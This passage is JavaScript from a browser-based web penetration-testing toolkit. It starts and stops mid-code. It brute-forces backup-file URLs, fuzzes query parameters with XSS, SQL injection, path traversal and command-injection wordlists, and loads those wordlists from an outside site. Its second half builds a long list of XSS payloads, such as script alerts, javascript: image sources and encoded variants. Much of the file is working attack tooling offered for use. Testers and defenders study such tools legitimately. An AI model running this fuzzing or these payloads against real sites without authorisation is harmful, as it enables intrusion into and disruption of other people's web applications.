	unsafeWindow.console.log("cur_file_to_fuzz: "+cur_file_to_fuzz);
	unsafeWindow.console.log("cur_file_ext: "+cur_file_ext);
	unsafeWindow.console.log("cur_filenameonly "+cur_filenameonly);
	unsafeWindow.console.log("cur_filedir "+cur_filedir);
	//var cur_file2_to_fuzz = cur_file_to_fuzz 
							

    if(document.getElementById('brute_force_result').innerHTML.toString().indexOf("Results:")==-1)
    {
            document.getElementById('brute_force_result').innerHTML += "<br><strong>BruteForce Results:</strong><br>";  }
 
 	document.getElementById('brute_force_loading_img').innerHTML += '<br>=>1) Pattern to match: ' + cur_file_to_fuzz+ '<br>';
	document.getElementById('brute_force_loading_img').innerHTML += '=>2) Pattern to match: ' + cur_file_to_fuzz+cur_file_ext + '<br>'; 
	
    var timeout=0;
    var start = 0;
    var s=0;					    
    var end = backupexts.length;
	
	//@style: admin.bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + "." + backupexts[s];
		
    	timeout+=500;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}	

    var timeout=0;
    var start = 0;
    var s=0;	

	//@style: admin_bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + "_" + backupexts[s];
    	timeout+=600;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}	

    var timeout=0;
    var start = 0;
    var s=0;	

	//@style: admin-bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + "-" + backupexts[s];
    	timeout+=700;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}
		
 
	//@style: admin.php.bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + cur_file_ext + "." + backupexts[s];
    	timeout+=800;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}	

    var timeout=0;
    var start = 0;
    var s=0;	
	//@style: admin.php_bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + cur_file_ext + "_" + backupexts[s];
    	timeout+=900;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}	

    var timeout=0;
    var start = 0;
    var s=0;	
//
	//@style: admin.php-bak
	while(s<end)
    {
    	
    	var url = cur_file_to_fuzz + cur_file_ext + "-" + backupexts[s];
    	timeout+=1000;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}
	
	var timeoutz=timeout;    
    var sz=0;
    var endz =backupzexts.length;
	
	//@style: admin.php.zip	
    while(sz<endz)
    {    	
    	var url = cur_file_to_fuzz + cur_file_ext + backupzexts[sz];
    	timeoutz+=1100;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + sz + ","+ endz + ",'Job: Backup Files Scanning..')",timeoutz);			timeoutz += 6000;
		//self.setTimeout("window.stop()",timeoutz);		
		sz++;  	
	}
			
	// [/Current File Scan]return;
	
	return;

	/*Full Scan but not recommmended
	
	for(var i=0;i<=document.getElementsByTagName("a").length-1;i++)
	{
		var thislink =document.getElementsByTagName("a")[i].href+"";
		var thisext = "";

		// Must not be in http://site.com/
		// Must be http://site.com/abc.php
		if(thislink.lastIndexOf("/")!=(thislink.length-1))
		{	
			//Must be within the same domain
			if(thislink.indexOf(yehg_url_scheme+document.domain)==0)
			{
				unsafeWindow.console.info("URL is : "+ thislink);
							
				thisURIComponent = thislink.replace(thisURI,'');		
																	
				unsafeWindow.console.log("URIComponent: "+thisURIComponent);																	
				unsafeWindow.console.log("URIComponent Index: "+thisURIComponent.indexOf("?"));										
				if(thislink.lastIndexOf("?")!=-1)
				{
					thisext = thisURIComponent.substring(thisURIComponent.indexOf("."),thisURIComponent.indexOf("?"));	
				}
				else
				{
					thisext = thisURIComponent.substring(thisURIComponent.indexOf("."),thisURIComponent.length);
				}				
				
				thisfile = thisURI + thisURIComponent.substr(0,thisURIComponent.indexOf("."));
				
				thisfilenameonly = thisURIComponent.substr(0,thisURIComponent.indexOf("."));
				thisfiledir =  thisfile.substr(0,thisfile.lastIndexOf("/")+1);
				
				unsafeWindow.console.info("FUZZ FILE Type 1   "+ thisfile); // + .zip
				//unsafeWindow.console.info("FUZZ FILE Type 2   "+ thisfile+thisext+".");// + .zip
				//unsafeWindow.console.info("FUZZ FILE Type 3   "+ thisfile+thisext+"-"); 
				 
				
				//unsafeWindow.console.info("FUZZ FILE Type 4   "+ thisfiledir + "_"+thisfilenameonly+thisext);
				//unsafeWindow.console.info("FUZZ FILE Type 5   "+ thisfiledir + "__"+thisfilenameonly+thisext);
				
				//unsafeWindow.console.info("Extension Extracted: "+ thisext);
				
				// Start Scanning Recursively
								
				//@style: admin.bak
				cur_file_to_fuzz = thisfile;
				cur_file_ext = thisext;
				
			    var timeout=0;
			    var start = 0;
			    var s=0;					
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + "." + backupexts[s];
			    	timeout+=1000;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}	
			
			    var timeout=0;
			    var start = 0;
			    var s=0;	
			
				//@style: admin_bak
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + "_" + backupexts[s];
			    	timeout+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}	
			
			    var timeout=0;
			    var start = 0;
			    var s=0;	
			
				//@style: admin-bak
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + "-" + backupexts[s];
			    	timeout+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}
					
			 
				//@style: admin.php.bak
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + cur_file_ext + "." + backupexts[s];
			    	timeout+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}	
			
			    var timeout=0;
			    var start = 0;
			    var s=0;	
			
				//@style: admin.php_bak
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + cur_file_ext + "_" + backupexts[s];
			    	timeout+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}	
			
			    var timeout=0;
			    var start = 0;
			    var s=0;	
			
				//@style: admin.php-bak
				while(s<end)
			    {
			    	
			    	var url = cur_file_to_fuzz + cur_file_ext + "-" + backupexts[s];
			    	timeout+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: Backup Files Scanning..')",timeout);
					timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);;
					//self.setTimeout("window.stop()",timeout);
					s++;  	
				}
				
				var timeoutz=0;    
			    var sz=0;
			    var endz =backupzexts.length;
				
				//@style: admin.php.zip	
			    while(sz<endz)
			    {    	
			    	var url = cur_file_to_fuzz + cur_file_ext + backupzexts[sz];
			    	timeoutz+=500;    	
					setTimeout("yehgBruteForceScan('"+url+"'," + sz + ","+ endz + ",'Job: Backup Files Scanning..')",timeoutz);			timeoutz += 6000;
					//self.setTimeout("window.stop()",timeoutz);		
					sz++;  	
				}
						
				
				break;
			}
			
		}
				 
		} 
	}*/ // end of FULL SCAN
}

unsafeWindow.yehgCurBruteForceURL = "";
	
unsafeWindow.yehgLoadBruteForceStart = function()
{
	unsafeWindow.yehgCurBruteForceURL =  prompt("Enter URL Path to bruteforce.\n\ne.g.\n"+document.URL.toString().substr(0,document.URL.toString().lastIndexOf("/")+1)+"\n"+document.URL.toString().substr(0,document.URL.toString().lastIndexOf("/")+1)+"{FUZZ}/cmdjsp.jsp\t[Replace {FUZZ} with payload strings]\n",document.URL.toString().substr(0,document.URL.toString().lastIndexOf("/")+1));
    if(unsafeWindow.yehgCurBruteForceURL == null || unsafeWindow.yehgCurBruteForceURL == "")return;
		
	var s =document.getElementById('yehg_brute_force_select'); 	
	if(s.options[s.selectedIndex].value.indexOf("Select")==-1 && s.options[s.selectedIndex].value.indexOf("HeaderVerbsAbuse")==-1 && s.options[s.selectedIndex].value.indexOf("BackupFiles")==-1)
	{
		document.getElementById('brute_force_loading_img').innerHTML = "<br>Loading ...";
		document.getElementById('brute_force_loading_img').style.display = '';
	    setTimeout("yehgLoadBruteForceFile()",1500);
	    unsafeWindow.yehgcurrentjob = "BruteForcing with " + s.options[s.selectedIndex].innerHTML;
    }
    else
    {
		alert("Select Bruteforce file!");
	}
}
unsafeWindow.yehg_osvdb = '';

unsafeWindow.yehgViewBruteForceFile = function()
{	
	var s =document.getElementById('yehg_brute_force_select'); 	
	if(s.options[s.selectedIndex].value.indexOf("Select")==-1 && s.options[s.selectedIndex].value.indexOf("HeaderVerbsAbuse")==-1 && s.options[s.selectedIndex].value.indexOf("FileFormatEnum")==-1)
	{
	    var wordbank_url = yehg_url+ '/lab/pr0js/pentest/wordlists/index.php?file='+s.options[s.selectedIndex].value;     	window.open(wordbank_url);
    }
    else
    {
		alert("Select Bruteforce file!");
	}		
}
unsafeWindow.yehgbruteforcestr = "";

unsafeWindow.yehgLoadBruteForceFile = function()
{
    unsafeWindow.yehgbruteforcestr = new Array();
    var s = document.getElementById('yehg_brute_force_select');
    var wordbank_url = yehg_url+ '/lab/pr0js/pentest/wordlists/index.php?file='+s.options[s.selectedIndex].value;     	unsafeWindow.yehgbruteforcecurrent_file = s.options[s.selectedIndex].text;
  
	var s = document.getElementById('yehg_brute_force_select');
	var lid = s.options[s.selectedIndex].text;	
	if(!document.getElementById(lid))
	{   
	    var pgHead = document.getElementsByTagName("head").item(0);
	    var objJsFile = document.createElement("script");
	    objJsFile.setAttribute('type','text/javascript');
	    objJsFile.setAttribute('src', wordbank_url);
	    objJsFile.setAttribute('onload',"yehgBruteForceStart();");
	    objJsFile.setAttribute('onerror',"alert('File not found or Error in loading fie!')");    
	    pgHead.appendChild(objJsFile);
	    
	}
	else
	{
		//alert("Gonna use Cache" + document.getElementById(lid).value);
		unsafeWindow.yehgbruteforcestr = document.getElementById(lid).value.toString().split(",");		
		unsafeWindow.yehgBruteForceStart();
		//alert("Cache Content: " + unsafeWindow.yehgbruteforcestr);
	}
	
	    
}

unsafeWindow.yehgLoadBruteForceCacheFile = function(id,content)
{
    // Cache contents in textarea
	if(!document.getElementById(id))
	{
		var txta = unsafeWindow.document.createElement("textarea");
		txta.setAttribute("id",id);
		txta.setAttribute("style","display:none");
		txta.value = content;
		document.body.appendChild(txta);
		
		return false;
	}
	else 
	{
		return document.getElementById(id).value;
	}	
	    
}

unsafeWindow.yehgbruteforcible = false;
unsafeWindow.yehgbruteforceresult = "";

unsafeWindow.yehgBruteForceStart = function()
{
	var s = document.getElementById('yehg_brute_force_select');
	var lid = s.options[s.selectedIndex].text;		
	
	if(!document.getElementById(lid))
	{
		unsafeWindow.yehgLoadBruteForceCacheFile(lid,unsafeWindow.yehgbruteforcestr);
		//alert("cached!");
	}	
	
    var bruteforcestr = unsafeWindow.yehgbruteforcestr;    
    document.getElementById('brute_force_loading_img').style.display = 'block';
    curdir = unsafeWindow.yehgCurBruteForceURL;
    var timeout=0;
    var start = 0;
    var s=0;
    var end = bruteforcestr.length;
	
    if(unsafeWindow.document.getElementById('brute_force_result').innerHTML.toString().indexOf("Results:")==-1)
    {
            document.getElementById('brute_force_result').innerHTML = "<br><strong>BruteForce Results:</strong><br>";  
			document.getElementById('brute_force_result').innerHTML += "<br>* " + unsafeWindow.yehgcurrentjob  ;	
	}
	else
	{
		document.getElementById('brute_force_result').innerHTML += "<br>* " + unsafeWindow.yehgcurrentjob  ;	
	}
	
    while(s<end)
    {
		if(curdir.indexOf("{FUZZ}") > -1)
			var url = curdir.replace("{FUZZ}",bruteforcestr[s]);
  	    else
			var url = curdir + bruteforcestr[s];
    	timeout+=500;    	
		setTimeout("yehgBruteForceScan('"+url+"'," + s + ","+ end + ",'Job: BruteForcing ...')",timeout);
		timeout += parseInt(unsafeWindow.document.getElementById('yehgBruteTimeOut').value);
		//self.setTimeout("window.stop()",timeout);
		s++;  	
	}	
}

unsafeWindow.yehgBruteForceScan = function(url,s,e,job)
{	
	// s = start , e = end, job = job name
	unsafeWindow.yehgWriteStatusLog(job,1);	
	document.getElementById('brute_force_loading_img').style.display = '';
	document.getElementById('brute_force_loading_img').innerHTML = '<br>Scanning for -> ' + url+ "&nbsp;&nbsp;&nbsp; [" + (s+1) +" of " +e+"]";	
	xhr.setRequestHeader("Referer",document.location);
	xhr.setRequestHeader("Cache-Control", "no-cache");

    xhr.open("HEAD",url,false);
    xhr.send(null);
	var show404 = 0;    
    if(xhr.readyState==4)
    {
    	if(xhr.status==200)
    	{
         	document.getElementById('brute_force_result').innerHTML += '<br>[<span style="color:#61B909">' + xhr.status + '</span>]&nbsp; <a target="_blank" style="color:yellow!important;text-decoration:underline;" href="' +  url +'">' + url +'</a>';unsafeWindow.yehgbruteforcible = true;
         	window.scrollTo(0,window.scrollY+15);
         //alert("Found->"+url);
		 }
         else if(xhr.status==403)
         {
         	document.getElementById('brute_force_result').innerHTML += '<br>[<span style="color:red">' + xhr.status + '</span>]&nbsp; <a target="_blank" style="color:yellow!important;text-decoration:underline;" href="' +  url +'">' + url +'</a>';unsafeWindow.yehgbruteforcible = true;
         	window.scrollTo(0,window.scrollY+15);
         }
         else if(show404==1)
         {
			document.getElementById('brute_force_result').innerHTML += '<br>[<span style="color:#CCCCCC">' + xhr.status + '</span>]&nbsp; <span style="color:#878787!important;">' + url +'</span>';
			window.scrollTo(0,document.getElementById('brute_force_result').offsetHeight+120);
		 }
         
    }
    
     if((s+1)==e)
	 {	 
	 	document.getElementById('brute_force_loading_img').style.display = 'none';	
	 	unsafeWindow.yehgWriteStatusLog("Job: Done",1);
	 	//alert("Done scanning!");
	 	
	 	if(unsafeWindow.yehgbruteforcible == false)
	 	{
			//document.getElementById('brute_force_result').innerHTML += "<br>=> No results for " + unsafeWindow.yehgbruteforcecurrent_file +"<br>" ;	
			if(unsafeWindow.yehgcurrentjob!="")
			{
				document.getElementById('brute_force_result').innerHTML += "<br>=> No results for " + unsafeWindow.yehgcurrentjob +"<br>" ;	
			}
			
			//reset for next rounds
			unsafeWindow.yehgbruteforcible = false;
		}
	 }
}


stat = "";
showstat = 0;
stat += '<br><span id="stat" style="font-weight:bold">[Stat]</span><br><br>';
stat += " Total Form: "+ document.getElementsByTagName("form").length+"<br>";
stat += " Total Link: "+ document.getElementsByTagName("a").length+"<br>";

if(document.getElementsByTagName("a").length>0 || document.getElementsByTagName("form").length >0)
{
    showstat = 1;
}
if(showstat==1){printdata += stat;}

unsafeWindow.yehgFuzzingHelp = function()
{
	alert("AutoFuzz KeyWords\n==========================\n\nFor XSS Test:\nvuln.php?str={XSS}\n" +
			"\nAs for Insert function, Use {$}\nThis will replace {$} with  desired inserted fuzz string.\nvuln.php?s1={$}&s2=v2&s3={$}&s4=v4&...etc\n"+
			"\nFor SQL Injection Test:\nvuln.php?str={SQL}\n"+
			"\nFor PathTraversal Test:\nvuln.php?str={TRA}\n"+
			"\nFor Command Injection Test:\nvuln.php?str={CMD}\n"+
			"\nFor Debug/Hidden Parameter Test:\nvuln.php?{DEBUG}\n"+
			"\nOtherwise, for your custom index from-to\n\nDo this:\nvuln.php?str={FUZZ}&str2=12\n\nJust for only 1 parameter, you can\nvuln.php?str="+
			"\n\nAdditional Options:\n\nvuln.php?str1={FUZZ}&str2={FUZZ}&str3=1&str4=valid\n\nYou can't use multiple keywords:\n\nvuln.php?str1={XSS}&str2={SQL}&str3=1&str4=valid[FALSE]\n\n ");
}
unsafeWindow.yehgSingleFuzz = function()
{
		var fuzz_url = document.getElementById('fuzz_url').value;
    	var re = /{(FUZZ|XSS|SQL|TRA|CMD|DEBUG)}/gi;

		if(fuzz_url.search(re)==-1)
		{
			window.open(fuzz_url);
		}			
		else
		{
			unsafeWindow.yehgFuzzingStart();
		}
}
unsafeWindow.yehgFuzzingStart = function()
{
	var fuzz_url = document.getElementById('fuzz_url').value;
	fuzz_url += '&yehg_content_length='+document.getElementById('yehg_content_length').value+
				'&yehg_operator='+document.getElementById('length_operator').options[document.getElementById('length_operator').selectedIndex].value+
				'&yehg_content_grep_criteria='+ document.getElementById('yehg_content_grep_criteria').options[document.getElementById('yehg_content_grep_criteria').selectedIndex].value + 
				'&yehg_grep='+ document.getElementById('yehg_grep').value ;
	fuzz_url = fuzz_url.replace(/(^\s|\s$)/g,""); //must not contain white spaces inbetween		
    var timeout=0;    
    var start = document.getElementById('fzfrom').value;    
   	var end = document.getElementById('fzto').value;   	
   	if(end<start){alert("Invalid Range!");return;}   	

		   	
	if(fuzz_url.indexOf("?")==-1)
	{
		alert('There is nothing to fuzz.\nPlease insert parameter(s) to fuzz.\n\neg.\nvulnerable.php?str={XSS}\nvulnerable.php?str={SQLInject}\vulnerable.php?str={FUZZ}&str2=valid\nvulnerable.php?str={FUZZ}&str2={FUZZ}\n\nClick \'Help\' for more info.');
		return;
	}
	if(fuzz_url.indexOf("{XSS}")>-1)
	{
		start = 1;
		end = 38;		
		document.getElementById('fzfrom').value = start;		
		document.getElementById('fzto').value = end;
		
	}
	else if(fuzz_url.indexOf("{SQL}")>-1)
	{
		start = 326;
		end = 428;		
		document.getElementById('fzfrom').value = start;		
		document.getElementById('fzto').value = end;		
	}
	else if(fuzz_url.indexOf("{TRA}")>-1)
	{
		start = 98;				
		end = 169;
		document.getElementById('fzfrom').value = start;		
		document.getElementById('fzto').value = end;
		
	}
	else if(fuzz_url.indexOf("{CMD}")>-1)
	{
		start = 73;
		end = 92;	
		document.getElementById('fzfrom').value = start;		
		document.getElementById('fzto').value = end;
	}

	else if(fuzz_url.indexOf("{DEBUG}")>-1)
	{
		start = 468;
		end = 506;
		document.getElementById('fzfrom').value = start;		
		document.getElementById('fzto').value = end;

	}
    var s=start;
    document.getElementById('fuzz_result').style.display = '';
    document.getElementById('fuzz_result').innerHTML = '';
	while(s<=end)
    {
    	var re = /{(FUZZ|XSS|SQL|TRA|CMD|DEBUG)}/gi;	
    	var payload = document.getElementById('fuzzdb').options[s].value;
    	payload = escape(payload);
    	var url = fuzz_url.replace(re,payload);

    	timeout+=500;
    	setTimeout("yehgOpenFuzzWindow('"+url+"'," + s + ","+ end + ")",timeout);
		/*if(fuzz_url.indexOf("{DEBUG}")>-1)		    	    	
			setTimeout("yehgOpenFuzzWindow('"+url+"'," + s + ","+ end + ")",timeout);
		else
			setTimeout("yehgOpenFuzzWindow('"+encodeURIComponent(url)+"'," + s + ","+ end + ")",timeout);-*/
		timeout += (document.getElementById('fztimer').value*1000);
		self.setTimeout("window.stop()",timeout);			
		s++;  	
	}	
}
unsafeWindow.yehgWarnDisablePopupBlocker = 0;
/*unsafeWindow.onerror = function(a,b,c)
{
	alert(a + "\n" + b +  "\n" + c);
}*/
unsafeWindow.index = 0;
unsafeWindow.yehgOpenFuzzWindow = function(url,s,e)
{
	unsafeWindow.yehgWriteStatusLog("Job: Fuzzing ...",1);
	unsafeWindow.index = s;
	document.getElementById('fuzz_result').innerHTML = '<br>Fuzzing Index No. '+ s+ ' of ' + e + '<br><br> Fuzzing URL -> ' + url+'<br><br>';	
	var u = window.open(decodeURIComponent(url));
	if(u==null)
	{
		if(unsafeWindow.yehgWarnDisablePopupBlocker==0)
		{
			alert("Disable Popup blocker!\n\nType about:config in browser address bar.\nSet the value of:\n\ndom.popup_maximum\n\nto\n\n1000000000\n\nRestart your browser.\n");
			unsafeWindow.yehgWarnDisablePopupBlocker=1;return;
		}
		
	}
	if(s>=e){document.getElementById('fuzz_result').innerHTML = "Done Fuzzing!<br>Good Luck!";unsafeWindow.yehgWriteStatusLog("Job: Fuzzing Done!",1);}
	
}
unsafeWindow.yehgInsertFuzz = function()
{
	var fuzzdb =document.getElementById('fuzzdb');
	var fuzz_url = document.getElementById('fuzz_url').value;
    if(fuzzdb.selectedIndex!=0 && (fuzzdb.options[fuzzdb.selectedIndex].value.search(/All\sXSS|RSnake/)==-1))
    {
		 if(fuzz_url.indexOf("{$}"))
		 {
		 	document.getElementById('fuzz_url').value = fuzz_url.replace(/{\$}/g, fuzzdb.options[fuzzdb.selectedIndex].value);	
		 }
		 else
		 {
			document.getElementById('fuzz_url').value += fuzzdb.options[fuzzdb.selectedIndex].value;	
		 }
	}    
	else 
	{
		alert("Select a fuzz string!");
	}	
}
unsafeWindow.yehgPrepareFuzzUrl = function()
{
    if(document.location.toString().indexOf("?") ==-1 && document.location.toString().indexOf("?") ==-1 && document.location.toString().indexOf("#") ==-1 )
    {
		return document.location + "?=";	
	}
	else
	{
		return document.location;
	}
     
}

unsafeWindow.yehgInvokeFuzz  = function()
{
	var fuzzopt =document.getElementById('fuzzopt');
	fuzzopt = fuzzopt.options[fuzzopt.selectedIndex].value;
	var fuzz_url = document.getElementById('fuzz_url').value;
	document.getElementById('btnFuzz').disabled = "disabled";
	
	switch(fuzzopt)
	{
		case "fuzz":unsafeWindow.yehgSingleFuzz();
		break;
		case "bakup":unsafeWindow.yehgBackupFileSearch();
		break;
		case "headercheck":window.open('http://yegh.net/lab/pr0js/pentest/header_options.php?host='+document.domain,'_blank','dependent=1');
		break;
		case "csrf":window.open('http://yegh.net/lab/pr0js/pentest/cross_site_request_forgery.php?url='+encodeURIComponent(fuzz_url),'_blank','dependent=1');
		break;						
		case "cross_frame":window.open('http://yegh.net/lab/pr0js/pentest/cross_site_framing.php?url='+encodeURIComponent(fuzz_url),'_blank','dependent=1');
		break;
	}   

	setTimeout("document.getElementById('btnFuzz').disabled = ''",5000);
}

printdata += '<br><b>[Fuzz URL]</b><br>';
printdata += '<br><textarea cols="100" wrap="soft" style="font-family:arial;font-size:12px;word-wrap:break-word;" rows="4" id="fuzz_url">' + unsafeWindow.yehgPrepareFuzzUrl() + '</textarea><br><br>Select Fuzz Type: <select id="fuzzopt"><option value="fuzz">Fuzz [default]</option><option value="bakup">BackupFiles</option><option value="headercheck">HeaderCheck</option><option value="csrf">CSRF</option><option value="cross_frame">CS Framing</option></select>&nbsp;&nbsp;<input type="button" id="btnFuzz" value="Fuzz &gt;&gt;" onclick="yehgInvokeFuzz()">&nbsp;&nbsp;<input type="button" value="Clear" onclick="document.getElementById(\'fuzz_url\').value=\'\';document.getElementById(\'fuzz_url\').focus();"> &nbsp;[<span style="cursor:pointer;color:yellow!important;" onclick="yehgFuzzingHelp()">Help</span>]<br>';
printdata += '<br><fieldset style="border:1px solid white;background-color:black!important;color:white!important;"><legend>&nbsp;&nbsp;Fuzz Options&nbsp;&nbsp;</legend>Fuzz Db: <select id="fuzzdb"><option>-- Check --</option>';
printdata += '<optgroup label="XSS"><option value="---!&gt;&lt;!--&quot;&gt;xxx&lt;P&gt;yyy">1) ---!&gt;&lt;!--&quot;&gt;xxx&lt;P&gt;yyy..</option><option value="&quot;&gt;&lt;script&gt;&quot;">2) &quot;&gt;&lt;script&gt;&quot;..</option><option value="};&quot;&gt;&lt;/a&gt;&lt;/textarea&gt;&lt;/em&gt;&lt;/b&gt;&lt;/style&gt;&lt;/xmp&gt;&lt;/center&gt;&lt;/iframe&gt;&lt;/frameset&gt;&lt;/div&gt;&lt;/span&gt;&lt;/layer&gt;&lt;/label&gt;&lt;/noscript&gt;&lt;/noframe&gt;&lt;/embed&gt;&lt;/object&gt;&lt;/table&gt;&lt;/button&gt;&lt;/p&gt;&lt;/form&gt;&lt;/legend&gt;&lt;/fieldset&gt;&lt;/script&gt;&lt;/title&gt;&lt;/select&gt;&lt;/strong&gt;&lt;/code&gt;&lt;/h1&gt;&lt;/h2&gt;&lt;/h3&gt;&lt;/h4&gt;&lt;/h5&gt;&lt;/h6&gt;&lt;/font&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))&lt;/script&gt;//\n\n/**\n\n&lt;!--\n\n">3) &lt;script&gt;..&lt;/script&gt..</option><option value="&lt;&lt;script&gt;alert(0);//&lt;&lt;/script&gt;">4) &lt;&lt;script&gt;..;//&lt;&lt..</option><option value="&lt;script&gt;document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))&lt;/script&gt;">5) &lt;script&gt;..&lt;/script&gt..</option><option value="&#039;&gt;&lt;script&gt;document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))&lt;/script&gt;">6) &#039;&gt;&lt;script&gt;..&lt;..</option><option value="&quot;&gt;&lt;script&gt;document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));&lt;/script&gt;">7) &quot;&gt;&lt;script&gt;..;&lt;/script&gt..</option><option value="\\&quot;;document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));//">8) \\&quot;;..;//..</option><option value="%3cscript%3edocument.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));%3c/script%3e">9) %3cscript%3e..;%3c/script%3e..</option><option value="%3cscript%3edocument.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));%3c%2fscript%3e">10) %3cscript%3e..;%3c%2fscript%3e..</option><option value="%3Cscript%3Edocument.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))%3C/script%3E">11) %3Cscript%3E..;%3C/script%3E..</option><option value="&amp;ltscript&amp;gtdocument.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));&lt;/script&gt;">12) &amp;ltscript&amp;gt..;&lt;/sc..</option><option value="&amp;ltscript&amp;gtdocument.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33));&amp;ltscript&amp;gtalert">13) &amp;ltscript&amp;gt..;&amp;lt..</option><option value="&lt;xss&gt;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&lt;/vulnerable&gt;">14) &lt;xss&gt;&lt;script&gt;alert(&#039;XSS&#039;)&lt..</option><option value="&lt;IMG%20SRC=&#039;javascript:document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))&#039;&gt;">15) &lt;IMG%20SRC=&#039;javascript:..</option><option value="&lt;IMG SRC=&quot;javascript:alert(&#039;XSS&#039;);&quot;&gt;">16) &lt;IMG SRC=&quot;javascript:alert(&#039;XSS&#039;..</option><option value="&lt;IMG SRC=&quot;javascript:alert(&#039;XSS&#039;)&quot;">17) &lt;IMG SRC=&quot;javascript:alert(&#039;XSS&#039;..</option><option value="&lt;IMG SRC=javascript:alert(&#039;XSS&#039;)&gt;">18) &lt;IMG SRC=javascript:alert(&#039;XSS&#039;)&gt;..</option><option value="&lt;IMG SRC=JaVaScRiPt:alert(&#039;XSS&#039;)&gt;">19) &lt;IMG SRC=JaVaScRiPt:alert(&#039;XSS&#039;)&gt;..</option><option value="&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;">20) &lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quo..</option><option value="&lt;IMG SRC=`javascript:alert(&quot;&#039;XSS&#039;&quot;)`&gt;">21) &lt;IMG SRC=`javascript:alert(&quot;&#039;XSS&#039..</option><option value="&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;">22) &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(..</option><option value="&lt;IMG 